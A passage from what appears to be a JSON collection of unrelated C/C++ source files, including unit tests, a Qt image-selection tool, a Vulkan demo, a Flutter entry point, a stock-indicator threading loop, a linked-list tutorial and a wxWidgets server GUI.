matching0);\n         const auto cost1     = assignment_cost<double>(f, matching1);\n         CATCH_REQUIRE(std::fabs(cost0 - cost1) < 1e20);\n      };\n\n      for(auto i = 0; i < 1000; ++i) test_it(true); // test degenerate cases\n      for(auto i = 0; i < 1000; ++i) test_it(false);\n   }\n}\n\n// ------------------------------------------------------------------------ main\n//\nint main(int argc, char** argv)\n{\n   Catch::Session session; // There must be exactly one instance\n\n   // Let Catch (using Clara) parse the command line\n   auto return_code = session.applyCommandLine(argc, argv);\n   if(return_code != EXIT_SUCCESS) return return_code; // Command line error\n\n   return session.run();\n}\n",
    "#include \"rovio/Camera.hpp\"\n#include \"gtest/gtest.h\"\n#include <assert.h>\n\n#include \"../include/rovio/ImagePyramid.hpp\"\n#include \"../include/rovio/FeatureManager.hpp\"\n#include \"../include/rovio/MultilevelPatchAlignment.hpp\"\n\nusing namespace rovio;\n\nclass MLPTesting : public virtual ::testing::Test {\n protected:\n  static const int nLevels_ = 2;\n  static const int patchSize_ = 2;\n  static const int imgSize_ = (patchSize_+2)*pow(2,nLevels_-1)+4;\n  static const int nMax_ = 20;\n  static const int nCam_ = 2;\n  static const int dx_ = 2;\n  static const int dy_ = 3;\n\n  ImagePyramid<nLevels_> pyr1_;\n  ImagePyramid<nLevels_> pyr2_;\n  cv::Mat img1_;\n  cv::Mat img2_;\n  Patch<patchSize_> p_;\n  FeatureManager<nLevels_,patchSize_,nCam_> feature_;\n  FeatureCoordinates c_;\n  cv::Point2f pixel_;\n  V3D bearing_;\n  FeatureDistance d_;\n  FeatureStatistics<nCam_> stat_;\n  MultilevelPatch<nLevels_,patchSize_> mp_;\n  Eigen::Matrix2f warp_c_;\n  Eigen::Matrix2d warp_nor_;\n  Camera camera_;\n  MultilevelPatchAlignment<nLevels_,patchSize_> mpa_;\n  MLPTesting(): c_(&camera_){\n    static_assert(imgSize_*dx_*dy_<255,\"imgSize to large for gradients\");\n    pixel_ = cv::Point2f(patchSize_/2+1,patchSize_/2+1);\n    bearing_ = V3D(patchSize_/2+1,patchSize_/2+1,1);\n    bearing_.normalize();\n    c_.set_c(pixel_);\n    warp_c_ << 0.1, 0.5, 0.7, -0.2;\n    c_.set_warp_c(warp_c_);\n    warp_nor_ = c_.get_warp_nor();\n\n    stat_.localQualityRange_ = 3;\n    stat_.localVisibilityRange_ = 4;\n    stat_.minGlobalQualityRange_ = 5;\n\n    img1_ = cv::Mat::zeros(imgSize_,imgSize_,CV_8UC1);\n    uint8_t* img_ptr = (uint8_t*) img1_.data;\n    for(int i=0;i<imgSize_;i++){\n      for(int j=0;j<imgSize_;j++, ++img_ptr){\n        *img_ptr = i*dy_+j*dx_;\n      }\n    }\n    img2_ = cv::Mat::zeros(imgSize_,imgSize_,CV_8UC1);\n    img_ptr = (uint8_t*) img2_.data;\n    for(int i=0;i<imgSize_;i++){\n      for(int j=0;j<imgSize_;j++, ++img_ptr){\n        if(j<imgSize_/2 & i<imgSize_/2){\n          *img_ptr = 0;\n        } else {\n          *img_ptr = 255;\n        }\n      }\n    }\n    pyr1_.computeFromImage(img1_);\n    pyr2_.computeFromImage(img2_);\n  }\n};\n\n// Test constructors/reset\nTEST_F(MLPTesting, constructors) {\n  FeatureManager<nLevels_,patchSize_,nCam_> feature;\n  ASSERT_EQ(feature.idx_,-1);\n}\n\n// Test coordinates getters and setters\nTEST_F(MLPTesting, coordinates) {\n  c_.set_c(pixel_);\n  ASSERT_EQ(c_.valid_c_,true);\n  ASSERT_EQ(c_.valid_nor_,false);\n  ASSERT_EQ(c_.get_c(),pixel_);\n  ASSERT_NEAR((c_.get_nor().getVec()-bearing_).norm(),0.0,1e-8);\n  ASSERT_EQ(c_.valid_nor_,true);\n  c_.set_nor(LWF::NormalVectorElement(bearing_));\n  ASSERT_EQ(c_.valid_c_,false);\n  ASSERT_EQ(c_.valid_nor_,true);\n  ASSERT_NEAR((c_.get_nor().getVec()-bearing_).norm(),0.0,1e-8);\n  ASSERT_EQ(c_.get_c(),pixel_);\n  ASSERT_EQ(c_.valid_c_,true);\n}\n\n// Test corner getters and setters\nTEST_F(MLPTesting, corner) {\n  c_.set_c(pixel_);\n  c_.warp_c_.setZero();\n  c_.warp_nor_.setZero();\n  c_.set_warp_nor(warp_nor_);\n  ASSERT_EQ(c_.valid_warp_nor_,true);\n  ASSERT_EQ(c_.valid_warp_c_,false);\n  ASSERT_NEAR((c_.get_warp_nor()-warp_nor_).norm(),0.0,1e-10);\n  ASSERT_EQ(c_.valid_warp_nor_,true);\n  ASSERT_EQ(c_.valid_warp_c_,false);\n  ASSERT_NEAR((c_.get_warp_c()-warp_c_).norm(),0.0,1e-10);\n  ASSERT_EQ(c_.valid_warp_c_,true);\n  c_.warp_c_.setZero();\n  c_.warp_nor_.setZero();\n  c_.set_warp_c(warp_c_);\n  ASSERT_EQ(c_.valid_warp_nor_,false);\n  ASSERT_EQ(c_.valid_warp_c_,true);\n  ASSERT_NEAR((c_.get_warp_c()-warp_c_).norm(),0.0,1e-10);\n  ASSERT_EQ(c_.valid_warp_nor_,false);\n  ASSERT_EQ(c_.valid_warp_c_,true);\n  ASSERT_NEAR((c_.get_warp_nor()-warp_nor_).norm(),0.0,1e-10);\n  ASSERT_EQ(c_.valid_warp_nor_,true);\n}\n\n// Test statistics\nTEST_F(MLPTesting, statistics) {\n  double localQuality[nCam_];\n  for(int i=0;i<nCam_;i++){\n    localQuality[i] = 1.0;\n  }\n  double jointLocalVisibility = 1.0;\n  ASSERT_EQ(stat_.countTrackingStatistics(UNKNOWN),2);\n  ASSERT_EQ(stat_.countTrackingStatistics(NOT_IN_FRAME),0);\n  ASSERT_EQ(stat_.countTrackingStatistics(FAILED_ALIGNEMENT),0);\n  ASSERT_EQ(stat_.countTrackingStatistics(FAILED_TRACKING),0);\n  ASSERT_EQ(stat_.countTrackingStatistics(TRACKED),0);\n  ASSERT_EQ(stat_.trackedInSomeFrame(),false);\n  ASSERT_EQ(stat_.countTot(),1);\n  ASSERT_EQ(stat_.countInFrame(),0);\n  ASSERT_EQ(stat_.countTracked(),0);\n  stat_.increaseStatistics(0.1);\n  jointLocalVisibility = (1-1.0/stat_.localVisibilityRange_)*jointLocalVisibility;\n  ASSERT_EQ(stat_.countTrackingStatistics(UNKNOWN),4);\n  ASSERT_EQ(stat_.countTrackingStatistics(NOT_IN_FRAME),0);\n  ASSERT_EQ(stat_.countTrackingStatistics(FAILED_ALIGNEMENT),0);\n  ASSERT_EQ(stat_.countTrackingStatistics(FAILED_TRACKING),0);\n  ASSERT_EQ(stat_.countTrackingStatistics(TRACKED),0);\n  ASSERT_EQ(stat_.trackedInSomeFrame(),false);\n  ASSERT_EQ(stat_.countTot(),2);\n  ASSERT_EQ(stat_.countInFrame(),0);\n  ASSERT_EQ(stat_.countTracked(),0);\n  stat_.increaseStatistics(0.2);\n  jointLocalVisibility = (1-1.0/stat_.localVisibilityRange_)*jointLocalVisibility;\n  stat_.status_[0] = TRACKED;\n  ",
    "#include <iostream>\n#include <cstdlib>\n#include <ctime>\n#include <iomanip>\n\nusing namespace std;\n\nvoid Create(int* a, const int size, const int Low, const int High) \n{\n    for (int i = 0; i < size; i++) \n        a[i] = Low + rand() % (High - Low + 1);\n    \n}\n\nvoid Print(const int* a, const int size) \n{\n    for (int i = 0; i < size; i++) \n        cout << setw(4) << a[i];\n    cout << endl;\n}\n\n// \u00ee\u00e1\u00f7\u00e8\u00f1\u00eb. \u00ea\u00b3\u00eb\u00fc\u00ea\u00ee\u00f1\u00f2\u00b3, \u00f1\u00f3\u00ec\u00e8 \u00b3 \u00e7\u00e0\u00ec\u00b3\u00ed\u00e8 \u00e5\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2\u00b3\u00e2 \u00ed\u00e0 \u00ed\u00f3\u00eb\u00b3\nvoid ProcessArray(int* a, const int size, int& count, int& sum) \n{\n    count = 0;\n    sum = 0;\n    for (int i = 0; i < size; i++)\n        if (!(a[i] % 2 != 0 && a[i] % 3 == 0)) { // \u00ed\u00e5\u00ef\u00e0\u00f0\u00ed\u00e8\u00e9 \u00b3 \u00ea\u00f0\u00e0\u00f2\u00ed\u00e8\u00e9 3\n            sum += a[i];\n            count++;\n            a[i] = 0;\n        }\n}\n\nint main() {\n    srand((unsigned)time(0));\n\n    const int n = 21;\n    int b[n];\n\n    int Low = 10, High = 90;\n\n    Create(b, n, Low, High);\n\n    cout << \"Start array: \" << endl;\n    Print(b, n);\n\n    int count = 0, sum = 0;\n    ProcessArray(b, n, count, sum);\n\n    cout << \"Number of elements that meet the criteria: \" << count << endl;\n    cout << \"Sum of those elements: \" << sum << endl;\n\n    cout << \"Modified array: \" << endl;\n    Print(b, n);\n\n    return 0;\n}\n",
    "#include \"tool.h\"\n\n#include \"xsheetpreviewarea.h\"\n\n#include <QUndoCommand>\n#include <QGuiApplication>\n#include <QApplication>\n#include <QClipboard>\n#include <QMimeData>\n#include <QMenu>\n#include <QKeyEvent>\n#include <QColorDialog>\n\nbool operator<(const QColor& a, const QColor& b) {\n  return a.redF() < b.redF() || a.greenF() < b.greenF() ||\n         a.blueF() < b.blueF() || a.alphaF() < b.alphaF();\n}\n\nnamespace {\n\nQImage removeMatte(QImage& image, QColor matteColor) {\n  double mc[3] = {matteColor.blueF(), matteColor.greenF(), matteColor.redF()};\n\n  double b_len = std::sqrt(mc[0] * mc[0] + mc[1] * mc[1] + mc[2] * mc[2]);\n\n  double b[3] = {-matteColor.blueF() / b_len, -matteColor.greenF() / b_len,\n                 -matteColor.redF() / b_len};\n\n  QMap<QColor, QColor> resultMap;\n\n  QImage retImage(image.size(), QImage::Format_ARGB32_Premultiplied);\n  uchar* s_p = image.bits();\n  uchar* d_p = retImage.bits();\n  for (int i = 0; i < image.width() * image.height(); i++) {\n    QColor sc((int)s_p[2], (int)s_p[1], (int)s_p[0], (int)s_p[3]);\n    if (s_p[3] == 0 || sc == matteColor) {\n      for (int c = 0; c < 4; c++, d_p++, s_p++) *d_p = 0;\n      continue;\n    }\n\n    if (resultMap.contains(sc)) {\n      QColor resultColor = resultMap.value(sc);\n      d_p[0]             = (uchar)resultColor.blue();\n      d_p[1]             = (uchar)resultColor.green();\n      d_p[2]             = (uchar)resultColor.red();\n      d_p[3]             = (uchar)resultColor.alpha();\n      s_p += 4;\n      d_p += 4;\n      continue;\n    }\n\n    // unpremultiply\n    double color[4];\n    color[3] = (double)s_p[3] / 255.;\n    for (int c = 0; c < 3; c++) color[c] = ((double)s_p[c] / 255.) / color[3];\n\n    double a[3] = {color[0] - mc[0], color[1] - mc[1], color[2] - mc[2]};\n\n    double alpha = (a[0] * b[0] + a[1] * b[1] + a[2] * b[2]) / b_len;\n    if (alpha < 0.)\n      alpha = 0.;\n    else if (alpha > 1.)\n      alpha = 1.;\n\n    uchar alpha_c = (uchar)(alpha * 255.);\n\n    // blue\n    d_p[0] = 0;\n    // green\n    d_p[1] = 0;\n    // red\n    d_p[2] = 0;\n    // alpha\n    d_p[3] = alpha_c;\n\n    QColor dc((int)d_p[2], (int)d_p[1], (int)d_p[0], (int)d_p[3]);\n    resultMap.insert(sc, dc);\n\n    s_p += 4;\n    d_p += 4;\n  }\n\n  return retImage;\n}\n}  // namespace\n\nclass SelectionRectSelectUndo : public QUndoCommand {\n  SelectionTool* m_tool;\n  QRect m_rect;\n  QImage m_selectedImg;\n\npublic:\n  SelectionRectSelectUndo(SelectionTool* tool, QRect rect, QImage selectedImg)\n      : m_tool(tool), m_rect(rect), m_selectedImg(selectedImg) {}\n  void undo() {\n    m_tool->pasteImage(m_rect, m_selectedImg, true);\n    m_tool->setSelectedImage(QImage());\n    m_tool->clearSelection();\n  }\n  void redo() {\n    m_tool->pasteImage(m_rect, QImage(), true);\n    m_tool->setSelectedImage(m_selectedImg);\n    m_tool->select(m_rect, m_rect);\n  }\n};\n\nclass SelectionFreeHandSelectUndo : public QUndoCommand {\n  SelectionTool* m_tool;\n  QRect m_rect;\n  QPainterPath m_path;\n  QImage m_selectedImg;\n\npublic:\n  SelectionFreeHandSelectUndo(SelectionTool* tool, QRect rect,\n                              QPainterPath path, QImage selectedImg)\n      : m_tool(tool), m_rect(rect), m_path(path), m_selectedImg(selectedImg) {\n    QImage maskImg(rect.size(), QImage::Format_ARGB32_Premultiplied);\n    maskImg.fill(Qt::black);\n    QPainter mp(&maskImg);\n    mp.setCompositionMode(QPainter::CompositionMode_DestinationOut);\n    mp.fillPath(m_path.translated(QPointF(-rect.topLeft())), QBrush(Qt::black));\n    mp.end();\n\n    QPainter p(&m_selectedImg);\n    p.setCompositionMode(QPainter::CompositionMode_DestinationOut);\n    p.drawImage(QPoint(), maskImg);\n    // p.fillPath(m_path.translated(QPointF(-rect.topLeft())),\n    // QBrush(Qt::black));\n    p.end();\n  }\n  void undo() {\n    m_tool->pasteImage(m_rect, m_selectedImg, false);\n    m_tool->setSelectedImage(QImage());\n    m_tool->clearSelection();\n  }\n  void redo() {\n    m_tool->clearImage(m_path);\n    m_tool->setSelectedImage(m_selectedImg);\n    m_tool->select(m_path);\n  }\n};\n// \u9078\u629e\u306e\u89e3\u9664\u306eUndo\nclass SelectionReleaseUndo : public QUndoCommand {\n  SelectionTool* m_tool;\n  QRect m_selectedRect, m_currentRect;\n  QImage m_selectedImg;\n  QImage m_beforePasteImg;\n  QPainterPath m_path;\n\npublic:\n  SelectionReleaseUndo(SelectionTool* tool, QRect selectedRect,\n                       QRect currentRect, QPainterPath path, QImage selectedImg,\n                       QImage beforePasteImg, QUndoCommand* parent = nullptr)\n      : QUndoCommand(parent)\n      , m_tool(tool)\n      , m_selectedRect(selectedRect)\n      , m_currentRect(currentRect)\n      , m_selectedImg(selectedImg)\n      , m_beforePasteImg(beforePasteImg)\n      , m_path(path) {}\n\n  void undo() {\n    if (!m_selectedImg.isNull()) {\n      // \u524d\u306e\u7d75\u3092\u8cbc\u308a\u4ed8\u3051\n      m_tool->pasteImage(m_currentRect, m_beforePasteImg, true,\n                         m_currentRect.size() != m_selectedRect.size());\n      // \u9078\u629e\u753b\u50cf\u3092\u623b\u3059\n      m_tool->setSelectedImage(m_selectedImg);\n    }\n    if (m_path.isEmpty())\n      // Rect\u3092\u9078\u629e\u72b6\u614b\u306b\u623b\u3059\n      m_tool->select(m_selectedRec",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"qr_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// Copyright (C) 2017 The Qt Company Ltd.\n// SPDX-License-Identifier: LicenseRef-Qt-Commercial OR GPL-3.0-only\n\n#include <QGuiApplication>\n#include <QVulkanInstance>\n#include <QVulkanFunctions>\n#include <QWindow>\n#include <QLoggingCategory>\n#include <qevent.h>\n\nstatic const int SWAPCHAIN_BUFFER_COUNT = 2;\nstatic const int FRAME_LAG = 2;\n\nclass VWindow : public QWindow\n{\npublic:\n    VWindow() { setSurfaceType(VulkanSurface); }\n    ~VWindow() { releaseResources(); }\n\nprivate:\n    void exposeEvent(QExposeEvent *) override;\n    void resizeEvent(QResizeEvent *) override;\n    bool event(QEvent *) override;\n\n    void init();\n    void releaseResources();\n    void recreateSwapChain();\n    void createDefaultRenderPass();\n    void releaseSwapChain();\n    void render();\n    void buildDrawCalls();\n\n    bool m_inited = false;\n    VkSurfaceKHR m_vkSurface;\n    VkPhysicalDevice m_vkPhysDev;\n    VkPhysicalDeviceProperties m_physDevProps;\n    VkDevice m_vkDev = 0;\n    QVulkanDeviceFunctions *m_devFuncs;\n    VkQueue m_vkGfxQueue;\n    VkQueue m_vkPresQueue;\n    VkCommandPool m_vkCmdPool = 0;\n\n    PFN_vkCreateSwapchainKHR m_vkCreateSwapchainKHR = nullptr;\n    PFN_vkDestroySwapchainKHR m_vkDestroySwapchainKHR;\n    PFN_vkGetSwapchainImagesKHR m_vkGetSwapchainImagesKHR;\n    PFN_vkAcquireNextImageKHR m_vkAcquireNextImageKHR;\n    PFN_vkQueuePresentKHR m_vkQueuePresentKHR;\n    PFN_vkGetPhysicalDeviceSurfaceCapabilitiesKHR m_vkGetPhysicalDeviceSurfaceCapabilitiesKHR;\n    PFN_vkGetPhysicalDeviceSurfaceFormatsKHR m_vkGetPhysicalDeviceSurfaceFormatsKHR;\n\n    QSize m_swapChainImageSize;\n    VkFormat m_colorFormat;\n    VkSwapchainKHR m_swapChain = 0;\n    uint32_t m_swapChainBufferCount = 0;\n\n    struct ImageResources {\n        VkImage image = 0;\n        VkImageView imageView = 0;\n        VkCommandBuffer cmdBuf = 0;\n        VkFence cmdFence = 0;\n        bool cmdFenceWaitable = false;\n        VkFramebuffer fb = 0;\n    } m_imageRes[SWAPCHAIN_BUFFER_COUNT];\n\n    uint32_t m_currentImage;\n\n    struct FrameResources {\n        VkFence fence = 0;\n        bool fenceWaitable = false;\n        VkSemaphore imageSem = 0;\n        VkSemaphore drawSem = 0;\n    } m_frameRes[FRAME_LAG];\n\n    uint32_t m_currentFrame;\n\n    VkRenderPass m_defaultRenderPass = 0;\n};\n\nvoid VWindow::exposeEvent(QExposeEvent *)\n{\n    if (isExposed() && !m_inited) {\n        qDebug(\"initializing\");\n        m_inited = true;\n        init();\n        recreateSwapChain();\n        render();\n    }\n\n    // Release everything when unexposed - the meaning of which is platform specific.\n    // Can be essential on mobile, to release resources while in background.\n#if 1\n    if (!isExposed() && m_inited) {\n        m_inited = false;\n        releaseSwapChain();\n        releaseResources();\n    }\n#endif\n}\n\nvoid VWindow::resizeEvent(QResizeEvent *)\n{\n    // Nothing to do here - recreating the swapchain is handled in render(),\n    // in fact calling recreateSwapChain() from here leads to problems.\n}\n\nbool VWindow::event(QEvent *e)\n{\n    switch (e->type()) {\n    case QEvent::UpdateRequest:\n        render();\n        break;\n\n    // Now the fun part: the swapchain must be destroyed before the surface as per\n    // spec. This is not ideal for us because the surface is managed by the\n    // QPlatformWindow which may be gone already when the unexpose comes, making the\n    // validation layer scream. The solution is to listen to the PlatformSurface events.\n    case QEvent::PlatformSurface:\n        if (static_cast<QPlatformSurfaceEvent *>(e)->surfaceEventType() == QPlatformSurfaceEvent::SurfaceAboutToBeDestroyed)\n            releaseSwapChain();\n        break;\n\n    default:\n        break;\n    }\n\n    return QWindow::event(e);\n}\n\nvoid VWindow::init()\n{\n    m_vkSurface = QVulkanInstance::surfaceForWindow(this);\n    if (!m_vkSurface)\n        qFatal(\"Failed to get surface for window\");\n\n    QVulkanInstance *inst = vulkanInstance();\n    QVulkanFunctions *f = inst->functions();\n    uint32_t devCount = 0;\n    f->vkEnumeratePhysicalDevices(inst->vkInstance(), &devCount, nullptr);\n    qDebug(\"%d physical devices\", devCount);\n    if (!devCount)\n        qFatal(\"No physical devices\");\n\n    // Just pick the first physical device for now.\n    devCount = 1;\n    VkResult err = f->vkEnumeratePhysicalDevices(inst->vkInstance(), &devCount, &m_vkPhysDev);\n    if (err != VK_SUCCESS)\n        qFatal(\"Failed to enumerate physical devices: %d\", err);\n\n    f->vkGetPhysicalDeviceProperties(m_vkPhysDev, &m_physDevProps);\n    qDebug(\"Device name: %s Driver version: %d.%d.%d\", m_physDevProps.deviceName,\n           VK_VERSION_MAJOR(m_physDevProps.driverVersion), VK_VERSION_MINOR(m_physDevProps.driverVersion),\n           VK_VERSION_PATCH(m_physDevProps.driverVersion));\n\n    uint32_t queueCount = 0;\n    f->vkGetPhysicalDeviceQueueFamilyProperties(m_vkPhysDev, &queueCount, nullptr);\n    QList<VkQueueFamilyProperties> queueFamilyProps(queueCount);\n    f->vkGetPhysicalDeviceQueueFamilyProperties(m_vkPhysDev, &queueCount, queueFamilyProps.data());\n    ",
    "#include \"main.h\"\n\n/* As requested by some folks struggling to understand this code,\n   The general flow of this entire program is as follows:\n\n   Create objects\n\n   Fetch latest stock data from IEX::stocks::chartRange as a Json::value object\n\n   Parse this data into a JSONdata object (see JSONdata files for more info) via\n   parseIEXdata function.\n\n   At this point, the program now has its' first set of data points ready to be\n   used by TechnicalAnalysis member functions. This is where the threads come\n   into play.\n\n   First, create a thread (t1) that will call AcquireIEXdata, passing\n   JSONdata obj (threadData) by reference (std::ref) to the function as well as\n   copies (std::move) of 'appl' (Apple's stock symbol which I am using for\n   testing this program) and '1d', 1d tells chartRange to return minute by\n   minute data (hence why all data from chartRange ends up in a variable called\n   minData). Thread T1 will gather a new set of data for minData obj, while the\n   other 9 threads use the current set of minData for calculations.\n\n   Each thread, T2 through T10, calls a different member function\n   of class TechnicalAnalysis that will calculate one of the TechnicalIndicators\n   inside the TechnicalIndicators struct (part of the TechnicalAnalysis class)\n\n   After all threads have been called, the program then waits for all of them to\n   finish running (join() functions).\n   Once they finish running, the objects that are full of old data are cleared,\n   and then the object filled with new data by thread T1 is copied into the\n   minData object. T1's threadData obj is then cleared, and the whole thread\n   process repeats.\n\n   NOTE: In the future, BEFORE the TIobj is cleared that data will be passed\n   into algorithms to make buy, sell, or hold decisions on the stock market. */\n\nint main()\n{\n        //Create objects\n        JSONdata minData, threadData, test;\n        TechnicalAnalysis TIobj;\n\n        Json::Value IEXdata = IEX::stocks::chartRange(\"aapl\", \"1d\"); //Pull stock data from IEX API\n        minData.parseIEXdata(IEXdata); //Move data from IEXdata into minData\n\n        while(1){\n                //Use a seperate thread to update data for next calcs while current calcs are done.\n                std::thread t1(AcquireIEXdata, std::ref(threadData),std::move(\"aapl\"), std::move(\"1d\"));\n\n                //Put all calcs onto threads, they all use thread safe methods for TIobj\n                std::thread t2(&TechnicalAnalysis::calcRSI,TIobj,std::ref(minData));\n                std::thread t3(&TechnicalAnalysis::calcFiftySMA,TIobj,std::ref(minData));\n                std::thread t4(&TechnicalAnalysis::calcHundredSMA,TIobj,std::ref(minData));\n                std::thread t5(&TechnicalAnalysis::calcHundFiftySMA,TIobj,std::ref(minData));\n                std::thread t6(&TechnicalAnalysis::calcTwoHundSMA,TIobj,std::ref(minData));\n                std::thread t7(&TechnicalAnalysis::calcFiftyEMA,TIobj,std::ref(minData));\n                std::thread t8(&TechnicalAnalysis::calcHundredEMA,TIobj,std::ref(minData));\n                std::thread t9(&TechnicalAnalysis::calcHundFiftyEMA,TIobj,std::ref(minData));\n                std::thread t10(&TechnicalAnalysis::calcTwoHundEMA,TIobj,std::ref(minData));\n\n                t1.join(); //Rejoin main thread, adding new data for next calcs\n                t2.join(); //Rejoin all threads to clear data before next calcs\n                t3.join();\n                t4.join();\n                t5.join();\n                t6.join();\n                t7.join();\n                t8.join();\n                t9.join();\n                t10.join();\n\n                //Clean up for reassignment\n                TIobj.clearTAobj();\n                minData.clearJSONstruct();\n\n                //Using var threadData here to temp store minData avoids deadlock.\n                minData = threadData;\n                test = threadData;\n\n                //Clean up for reassignment\n                threadData.clearJSONstruct();\n        }\n\n        return 0;\n}\n\n/* THREAD T1 USES THIS\n   This function essentially does the same thing as the lines:\n   Json::Value IEXdata = IEX::stocks::chartRange(\"aapl\", \"1d\");\n   minData.parseIEXdata(IEXdata);\n   from the main function, but this needs to be\n   in its own function this time because a thread is calling it, and I do not\n   want to overwrtie minData beforte TIobj is done with the data that is in\n   minData currently */\nvoid AcquireIEXdata(JSONdata &dataToFormat, const std::string &stock, const std::string &range)\n{\n        assert(dataToFormat.isEmpty() && !range.empty() && !stock.empty());\n\n        Json::Value IEXdata = IEX::stocks::chartRange(stock, range);\n        dataToFormat.parseIEXdata(IEXdata);\n}\n",
    "#include \"EntryPoint.h\"\n\nnamespace almond {\n\n    EntryPoint::EntryPoint(int width, int height, const std::wstring& title) \n        : pImpl(std::make_unique<Impl>(width, height, title)) {\n        // Any additional initialization can be added here\n    }\n\n    EntryPoint::~EntryPoint() noexcept = default; // No need to define further since unique_ptr will handle cleanup\n\n    EntryPoint::Impl::Impl(int width, int height, const std::wstring& title)\n        : width(width), height(height), title(title) {\n        // Initialize resources (e.g., create window, set up graphics context)\n    }\n\n    EntryPoint::Impl::~Impl() noexcept {\n        // Clean up resources (e.g., destroy window, release graphics context)\n    }\n\n    void EntryPoint::show() const {\n        pImpl->show();\n    }\n\n    bool EntryPoint::pollEvents() const {\n        return pImpl->pollEvents();\n    }\n\n    void EntryPoint::Impl::show() const {\n        // Implementation to show the window\n    }\n\n    bool EntryPoint::Impl::pollEvents() const {\n        // Implementation to poll for events\n        return true; // Modify according to actual event handling logic\n    }\n\n}\n",
    "#include <iostream>\nusing namespace std;\n\nclass Node {\npublic:\n    int Value;\n    Node* Next;\n};\n\nvoid printList(Node*n) {\n    while (n != NULL) {\n        cout << n->Value << \"\\n\";\n        n = n->Next;\n    }\n}\nvoid insertAtTheFront(Node**head, int newValue){\n    // 1. Prepare the new node\n    Node* newNode = new Node ();\n    newNode->Value = newValue;\n    // 2. Put it in front of current head\n    newNode->Next = *head;\n    // 3. Move head of list to point to the newNode\n    *head = newNode;\n}\nvoid insertAtTheEnd(Node**head, int newValue){\n    // 1. Prepare a newNode\n    Node* newNode = new Node();\n    newNode->Value = newValue;\n    newNode->Next = NULL;\n    // 2. If LinkedList is empty, make the newNode the head\n    if (*head == NULL) {\n        *head = newNode;\n        return;\n    }\n    // 3. Find the last node\n    Node* last = *head;\n    while (last->Next!=NULL){\n        last = last->Next;\n    }\n    // 4. Insert newNode after last node\n    last->Next = newNode;\n}\nvoid insertAfter(Node* previous, int newValue){\n    // 1. Check if previous node is NULL\n    if (previous == NULL) {\n        cout << \"Previous node cannot be NULL\";\n        return;\n    }\n    // 2. Prepare a newNode\n    Node* newNode = new Node();\n    newNode->Value = newValue;\n    // 3. Insert newNode after previous node\n    newNode->Next= previous->Next;\n    previous->Next= newNode;\n}\n\n\n\nint main() \n{\n    Node* head = new Node();\n    Node* second = new Node();\n    Node* third = new Node();\n\n    head->Value = 1;\n    head->Next = second;\n    second->Value = 2;\n    second->Next = third;\n    third->Value = 3;\n    third->Next = NULL;\n\n\n    insertAfter(head, -1);\n\n\n    printList(head);\n\n\n\n    return 0;\n}",
    "#include \"frame.h\"\nFrame::Frame(const wxString& title):wxFrame(NULL, -1, title, wxPoint(-1,-1), wxSize(-1,-1)){\n //Create the menu bar which will control the server state\n wxMenuBar* mb=new wxMenuBar;\n wxMenu* file=new wxMenu;\n wxMenu* server=new wxMenu;\n server->Append(ID_START, wxT(\"&Start\\tCtrl+S\"));\n server->Append(ID_STOP, wxT(\"S&top\\tCtrl+T\"));\n server->Append(ID_RESTART, wxT(\"Restart\"));\n file->AppendSubMenu(server, wxT(\"&Server\"));\n file->AppendSeparator();\n file->Append(wxID_EXIT, wxT(\"E&xit\\tAlt+X\"));\n mb->Append(file, wxT(\"&File\"));\n SetMenuBar(mb);\n \n mb->Enable(ID_STOP, 0);\n mb->Enable(ID_RESTART, 0);\n //Set the event handlers\n Bind(wxEVT_COMMAND_MENU_SELECTED, &Frame::on_start, this, ID_START);\n Bind(wxEVT_COMMAND_MENU_SELECTED, &Frame::on_stop, this, ID_STOP);\n Bind(wxEVT_COMMAND_MENU_SELECTED, &Frame::on_restart,  this, ID_RESTART);\n Bind(wxEVT_COMMAND_MENU_SELECTED, &Frame::on_quit, this, wxID_EXIT);\n Bind(wxEVT_CLOSE_WINDOW, &Frame::on_close, this);\n Bind(wxEVT_SOCKET, &Frame::on_sock, this, ID_SOCK);\n Bind(wxEVT_SOCKET, &Frame::on_server, this, ID_SERVER);\n \n //The ui of the window\n wxPanel* panel=new wxPanel(this, -1);\n wxBoxSizer* vbox=new wxBoxSizer(wxVERTICAL), *status_box=new wxBoxSizer(wxHORIZONTAL);\t\t\t//status_box is the sizer what contains the status label\n \n status=new wxStaticText(panel, -1, wxT(\"Stopped\"));\n status->SetForegroundColour(wxColour(255,0,0));\n \n tc_log=new wxTextCtrl(panel, -1, \"\", wxPoint(-1,-1),wxSize(-1,-1), wxTE_MULTILINE|wxTE_READONLY);\n \n status_box->Add(new wxStaticText(panel, -1, wxT(\"Status: \")), 0, wxRIGHT, 10);\n status_box->Add(status, 0,0,0);\n vbox->Add(status_box, 0, wxLEFT|wxTOP, 3);\n vbox->Add(tc_log, 1, wxEXPAND|wxALL, 20);\n panel->SetSizer(vbox);\n \n}\nvoid Frame::update_status(){\n wxMenuBar* mb=this->GetMenuBar();\n if(serv.is_started()){\n  status->SetForegroundColour(wxColour(0,255,0));\n  status->SetLabel(wxT(\"Started\"));\n }\n else{\n  status->SetForegroundColour(wxColour(255,0,0));\n  status->SetLabel(wxT(\"Stopped\"));\n }\n mb->Enable(ID_START, !serv.is_started());\n mb->Enable(ID_STOP, serv.is_started());\n mb->Enable(ID_RESTART,serv.is_started());\n}\nvoid Frame::log(const wxString& msg){\n 